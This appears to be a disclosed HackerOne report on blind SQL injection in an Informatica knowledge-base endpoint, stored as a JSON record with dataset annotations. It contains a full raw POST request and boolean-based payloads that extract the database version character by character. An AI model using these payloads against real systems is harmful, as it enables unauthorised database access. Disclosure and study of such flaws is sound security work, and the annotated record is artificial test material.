{
  "reported_to": "Informatica",
  "reported_by": "konqi ",
  "title": "[informatica.com] Blind SQL Injection",
  "content": "\nHi guys!\nJSON POST parameter \"docId\" is vulnerable to Blind SQL Injection attack\nPoC (Raw query)\nPOST /_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings HTTP/1.1\nUser-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.17\nHost: kb-test.informatica.com\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\nAccept-Encoding: gzip, deflate\nReferer: https://kb-test.informatica.com/KBExternal/pages/infasearch.aspx?k=pew\nCookie: ASP.NET_SessionId=03khmmjpaxvcos45opn2kg55; BIGipServerkb-test-pool=2670002442.22811.0000; WebAnalyticsSessionId2=b600796d-cd0e-4797-9610-872c18063793; kbemail=; mkt_cookie=anonymous; __cdrop=.D1P9XM.; _ga=GA1.2.1961398489.1453319834; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1452163097365-89988; s_vnum=1458351793680%26vn%3D1; gpv_p14=welcome%20page%3Awelcome; s_ppv=-%2C76%2C76%2C947; s_cc=true; gpv2=kb%3Aproddocsearch; s_nr=1455762795883-Repeat; s_invisit=true; s_sq=informatica-mysupport-dev%3D%2526pid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%2526oid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%252523%2526ot%253DA; wooTracker=vALSmwIXvuQp; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16850%7CMCMID%7C49728577452301121918884624029572688913%7CMCAAMLH-1456367601%7C6%7CMCAAMB-1456367601%7CNRX38WO0n5BH8Th-nqAG_A%7CMCAID%7CNONE; mbox=check#true#1455762863|session#1455762802845-749291#1455764663\nConnection: Keep-Alive\nContent-Length: 117\nAccept: application/json, text/javascript, /; q=0.01\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json;charset=utf-8\n{docId:\"1 and (select substring(@@version,1,1))='M'\", docTitle:'Getting an error while trying to import WSDL as...' }\nfor a TRUE query we get - {\"d\":\"3\"}\nfor a FALSE - {\"d\":\"\"}\nfor a Syntax error - {\"Message\":\"There was an error processing the request.\",\"StackTrace\":\"\",\"ExceptionType\":\"\"}\nso using this blind technique we can extract the data from Database\nexamples\ndocId:\"1 and (select substring(@@version,1,1))='M'\" - true\ndocId:\"1 and (select substring(@@version,2,1))='i'\" - true\ndocId:\"1 and (select substring(@@version,3,1))='c'\" - true\ndocId:\"1 and (select substring(@@version,22,1))='2'\"\ndocId:\"1 and (select substring(@@version,23,1))='0'\"\ndocId:\"1 and (select substring(@@version,24,1))='0'\"\ndocId:\"1 and (select substring(@@version,25,1))='8'\"\nand so on.. . So we have a MS SQL Server 2008\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1461071520,
  "report_url": "https://hackerone.com/reports/117073",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to '/_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings' with a JSON payload containing a 'docId' parameter."
    ],
    [
      2,
      "Manipulate the 'docId' parameter with SQL injection payloads to extract database information through boolean-based blind SQL injection."
    ]
  ],
  "vuln_description": "The 'docId' parameter in the JSON POST request is vulnerable to Blind SQL Injection, allowing an attacker to extract database information by manipulating boolean conditions in the SQL query.",
  "reason": "The attack involves a straightforward manipulation of a single parameter in a POST request to perform boolean-based blind SQL injection. The complexity is low as it does not require understanding of multiple components, complex application states, or novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The Blind SQL Injection vulnerability described in the report can be discovered using the methodology. The 'docId' parameter was identified via HTTP traffic analysis. The payloads used (substring checks against @@version) are simple boolean-based SQLi payloads without custom filter bypasses. The detection occurs in the same HTTP response channel (via differences in 'd' field values and error messages), satisfying the 'same channel' requirement. No stored XSS-like navigation or role-specific access is required for detection.",
    "is_simple_injection": true
  },
  "authnz_metadata": {
    "reason": "The Blind SQL Injection vulnerability involves manipulating the 'docId' parameter in a JSON POST request to extract database information. This is not directly related to authentication or authorization bypass (AuthN/AuthZ) or Insecure Direct Object Reference (IDOR) vulnerabilities. The described methodology focuses on testing authorization boundaries by swapping user sessions and resource IDs, which does not apply to SQL injection attacks.",
    "is_detectable": false
  }
}